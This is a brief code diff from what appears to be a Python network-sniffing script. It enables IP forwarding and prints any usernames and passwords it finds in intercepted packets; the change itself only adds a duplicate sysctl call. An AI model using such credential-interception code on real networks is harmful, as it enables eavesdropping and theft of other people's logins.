@@ -29,5 +29,6 @@ def process_sniffed_packet(packet):
             print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
 subprocess.call(['sysctl', 'net.ipv4.ip_forward=1'])
+subprocess.run('sysctl net.ipv4.ip_forward=1', shell=True)
 sniff("eth0")
     
